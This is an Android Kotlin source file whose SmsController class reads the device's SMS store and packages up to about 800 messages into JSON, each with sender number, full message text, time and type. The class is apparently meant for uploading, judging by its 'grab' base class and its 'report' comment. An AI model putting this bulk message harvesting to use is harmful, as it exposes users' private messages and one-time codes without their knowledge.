package com.qit.sms

import android.content.Context
import android.database.Cursor
import android.net.Uri
import android.text.TextUtils
import com.qit.base.GrabController
import org.json.JSONArray
import org.json.JSONObject

/**
 * Author：zhonglq
 * Time：2018/9/10 下午2:26
 * Description：短信相关管理器
 */
class SmsController(private val context: Context) : GrabController() {
    override fun doCall() {
        runWorkThread(Runnable {
            mListener?.onReceive(mType, querySmsRecords())
        })
    }

    private fun querySmsRecords(): String {
        val array = JSONArray()
        val resolver = context.contentResolver
        var cur: Cursor? = null
        try {
            cur = resolver.query(CONTENT_URI, null, null, null, "date desc")
            if (cur != null && cur.moveToFirst()) {
                var phoneNumber: String
                var smsBody: String

                val phoneNumberColumn = cur.getColumnIndex("address")
                val smsBodyColumn = cur.getColumnIndex("body")
                val dateColumn = cur.getColumnIndex("date")
                val typeColumn = cur.getColumnIndex("type")

                do {
                    var number = cur.getString(phoneNumberColumn)
                    if (TextUtils.isEmpty(number)) {
                        number = ""
                    }
                    phoneNumber = number
                    smsBody = cur.getString(smsBodyColumn)

                    if (array.length() > MAX_UPLOAD_COUNT) {
                        break
                    }

                    val entity = JSONObject()
                    try {
                        entity.put("phone", phoneNumber)
                        if (!TextUtils.isEmpty(smsBody)) {
                            entity.put("content", smsBody)
                        } else {
                            entity.put("content", "")
                        }

                        val time = cur.getLong(dateColumn)
                        entity.put("time", time)
                        entity.put("type", cur.getInt(typeColumn))
                        array.put(entity)
                    } catch (e: Exception) {
                        e.printStackTrace()
                        continue
                    }

                } while (cur.moveToNext())
            }
        } catch (ex: Exception) {
            ex.printStackTrace()
        } finally {
            cur?.close()
        }
        return array.toString()
    }

    companion object {

        /**
         * 短信上报最大条数
         */
        private val MAX_UPLOAD_COUNT = 800

        /**
         * The `content://` style URL for this table.
         */
        private val CONTENT_URI = Uri.parse("content://sms")

    }
}
